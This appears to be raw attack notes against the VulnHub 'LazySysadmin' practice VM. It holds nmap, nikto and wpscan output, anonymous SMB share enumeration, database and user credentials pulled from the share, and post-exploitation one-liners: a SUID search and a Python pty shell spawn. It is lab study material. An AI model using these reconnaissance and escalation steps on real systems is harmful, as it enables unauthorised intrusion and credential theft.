@@ -1,0 +1,241 @@
+LAZY SYSADMIN : https://www.vulnhub.com/entry/lazysysadmin-1,205/
+===================================================================================================
+NMAP : root@silver:~# nmap -sV -sS -Pn 192.168.56.101 -v
+===================================================================================================
+Starting Nmap 7.60 ( https://nmap.org ) at 2017-11-07 16:25 WIB
+NSE: Loaded 42 scripts for scanning.
+Initiating ARP Ping Scan at 16:25
+Scanning 192.168.56.101 [1 port]
+Completed ARP Ping Scan at 16:25, 0.22s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 16:25
+Completed Parallel DNS resolution of 1 host. at 16:25, 0.24s elapsed
+Initiating SYN Stealth Scan at 16:25
+Scanning 192.168.56.101 [1000 ports]
+Discovered open port 139/tcp on 192.168.56.101
+Discovered open port 22/tcp on 192.168.56.101
+Discovered open port 445/tcp on 192.168.56.101
+Discovered open port 80/tcp on 192.168.56.101
+Discovered open port 3306/tcp on 192.168.56.101
+Discovered open port 6667/tcp on 192.168.56.101
+Completed SYN Stealth Scan at 16:25, 1.26s elapsed (1000 total ports)
+Initiating Service scan at 16:25
+Scanning 6 services on 192.168.56.101
+Completed Service scan at 16:25, 11.01s elapsed (6 services on 1 host)
+NSE: Script scanning 192.168.56.101.
+Initiating NSE at 16:25
+Completed NSE at 16:25, 0.01s elapsed
+Initiating NSE at 16:25
+Completed NSE at 16:25, 0.00s elapsed
+Nmap scan report for 192.168.56.101
+Host is up (0.00076s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+3306/tcp open  mysql       MySQL (unauthorized)
+6667/tcp open  irc         InspIRCd
+MAC Address: 08:00:27:ED:F7:C8 (Oracle VirtualBox virtual NIC)
+Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.63 seconds
+           Raw packets sent: 1001 (44.028KB) | Rcvd: 1001 (40.052KB)
+===================================================================================================
+NIKTO : root@silver:~# nikto -h http://192.168.56.101
+===================================================================================================
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.56.101
++ Target Hostname:    192.168.56.101
++ Target Port:        80
++ Start Time:         2017-11-07 16:29:26 (GMT7)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.7 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0x8ce8 0x5560ea23d23c0 
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ OSVDB-3268: /old/: Directory indexing found.
++ Entry '/old/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ OSVDB-3268: /test/: Directory indexing found.
++ Entry '/test/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ OSVDB-3268: /Backnode_files/: Directory indexing found.
++ Entry '/Backnode_files/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 4 entries which should be manually viewed.
++ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ OSVDB-3268: /apache/: Directory indexing found.
++ OSVDB-3092: /apache/: This might be interesting...
++ OSVDB-3092: /old/: This might be interesting...
++ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.22
++ Uncommon header 'x-ob_mode' found, with contents: 0
++ OSVDB-3092: /test/: This might be interesting...
++ /info.php: Output from the phpinfo() function was found.
++ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /info.php?file=http://cirt.net/rfiinc.txt?: Output from the phpinfo() function was found.
++ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
++ Uncommon header 'link' found, with contents: <http://192.168.56.101/wordpress/index.php?rest_route=/>; rel="https://api.w.org/"
++ /wordpress/: A Wordpress installation was found.
++ /phpmyadmin/: phpMyAdmin directory found
++ 7690 requests: 0 error(s) and 27 item(s) reported on remote host
++ End Time:           2017-11-07 16:29:40 (GMT7) (14 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+===================================================================================================
+NIKTO : wpscan http://192.168.56.101/wordpress/
+===================================================================================================
+_______________________________________________________________
+        __          _______   _____                  
+        \ \        / /  __ \ / ____|                 
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team 
+                       Version 2.9.3
+          Sponsored by Sucuri - https://sucuri.net
+   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
+_______________________________________________________________
+
+[i] It seems like you have not updated the database for some time.
+[?] Do you want to update now? [Y]es [N]o [A]bort, default: [N]
+[+] URL: http://192.168.56.101/wordpress/
+[+] Started: Tue Nov  7 16:50:41 2017
+
+[!] The WordPress 'http://192.168.56.101/wordpress/readme.html' file exists exposing a version number
+[+] Interesting header: LINK: <http://192.168.56.101/wordpress/index.php?rest_route=/>; rel="https://api.w.org/"
+[+] Interesting header: SERVER: Apache/2.4.7 (Ubuntu)
+[+] Interesting header: X-POWERED-BY: PHP/5.5.9-1ubuntu4.22
+[!] Registration is enabled: http://192.168.56.101/wordpress/wp-login.php?action=register
+[+] XML-RPC Interface available under: http://192.168.56.101/wordpress/xmlrpc.php
+[!] Upload directory has directory listing enabled: http://192.168.56.101/wordpress/wp-content/uploads/
+[!] Includes directory has directory listing enabled: http://192.168.56.101/wordpress/wp-includes/
+
+[+] WordPress version 4.8.1 (Released on 2017-08-02) identified from advanced fingerprinting, meta generator, links opml, stylesheets numbers
+[!] 8 vulnerabilities identified from the version number
+
+[!] Title: WordPress 2.3.0-4.8.1 - $wpdb->prepare() potential SQL Injection
+    Reference: https://wpvulndb.com/vulnerabilities/8905
+    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/s
+    Reference: https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48
+    Reference: https://github.com/WordPress/WordPress/commit/fc930d3daed1c3acef010d04acc2c5de93cd18ec
+[i] Fixed in: 4.8.2
+
+[!] Title: WordPress 2.9.2-4.8.1 - Open Redirect
+    Reference: https://wpvulndb.com/vulnerabilities/8910
+    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
+    Reference: https://core.trac.wordpress.org/changeset/41398
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14725
+[i] Fixed in: 4.8.2
+
+[!] Title: WordPress 3.0-4.8.1 - Path Traversal in Unzipping
+    Reference: https://wpvulndb.com/vulnerabilities/8911
+    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
+    Reference: https://core.trac.wordpress.org/changeset/41457
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14719
+[i] Fixed in: 4.8.2
+
+[!] Title: WordPress 4.4-4.8.1 - Path Traversal in Customizer 
+    Reference: https://wpvulndb.com/vulnerabilities/8912
+    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
+    Reference: https://core.trac.wordpress.org/changeset/41397
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14722
+[i] Fixed in: 4.8.2
+
+[!] Title: WordPress 4.4-4.8.1 - Cross-Site Scripting (XSS) in oEmbed
+    Reference: https://wpvulndb.com/vulnerabilities/8913
+    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
+    Reference: https://core.trac.wordpress.org/changeset/41448
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14724
+[i] Fixed in: 4.8.2
+
+[!] Title: WordPress 4.2.3-4.8.1 - Authenticated Cross-Site Scripting (XSS) in Visual Editor
+    Reference: https://wpvulndb.com/vulnerabilities/8914
+    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
+    Reference: https://core.trac.wordpress.org/changeset/41395
+    Reference: https://blog.sucuri.net/2017/09/stored-cross-site-scripting-vulnerability-in-wordpress-4-8-1.html
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14726
+[i] Fixed in: 4.8.2
+
+[!] Title: WordPress 2.3-4.8.3 - Host Header Injection in Password Reset
+    Reference: https://wpvulndb.com/vulnerabilities/8807
+    Reference: https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
+    Reference: http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
+    Reference: https://core.trac.wordpress.org/ticket/25239
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295
+
+[!] Title: WordPress <= 4.8.2 - $wpdb->prepare() Weakness
+    Reference: https://wpvulndb.com/vulnerabilities/8941
+    Reference: https://wordpress.org/news/2017/10/wordpress-4-8-3-security-release/
+    Reference: https://github.com/WordPress/WordPress/commit/a2693fd8602e3263b5925b9d799ddd577202167d
+    Reference: https://twitter.com/ircmaxell/status/923662170092638208
+    Reference: https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html
+[i] Fixed in: 4.8.3
+
+[+] WordPress theme in use: twentyfifteen - v1.8
+
+[+] Name: twentyfifteen - v1.8
+ |  Latest version: 1.8 (up to date)
+ |  Last updated: 2017-06-08T00:00:00.000Z
+ |  Location: http://192.168.56.101/wordpress/wp-content/themes/twentyfifteen/
+ |  Readme: http://192.168.56.101/wordpress/wp-content/themes/twentyfifteen/readme.txt
+ |  Style URL: http://192.168.56.101/wordpress/wp-content/themes/twentyfifteen/style.css
+ |  Theme Name: Twenty Fifteen
+ |  Theme URI: https://wordpress.org/themes/twentyfifteen/
+ |  Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple,...
+ |  Author: the WordPress team
+ |  Author URI: https://wordpress.org/
+
+[+] Enumerating plugins from passive detection ...
+[+] No plugins found
+
+[+] Finished: Tue Nov  7 16:50:44 2017
+[+] Requests Done: 45
+[+] Memory used: 17.008 MB
+[+] Elapsed time: 00:00:03
+============================================================================
+smbclient : smbclient -L 192.168.56.101 -N
+============================================================================
+WARNING: The "syslog" option is deprecated
+Enter WORKGROUP\root's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	share$          Disk      Sumshare
+	IPC$            IPC       IPC Service (Web server)
+Reconnecting with SMB1 for workgroup listing.
+
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            LAZYSYSADMIN
+============================================================================
+smbclient : smbclient \\\\192.168.56.101\share$ -N
+============================================================================
+WARNING: The "syslog" option is deprecated
+Try "help" to get a list of possible commands.
+smb: \> 
+=====
+deets.txt
+password 12345
+=====
+wp-config.php
+/** MySQL database username */
+define('DB_USER', 'Admin');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'TogieMYSQL12345^^');
+
+
+
+find / -perm -4000 -type f -exec ls -lah {} \;
+python -c 'import pty;pty.spawn("/bin/bash");'
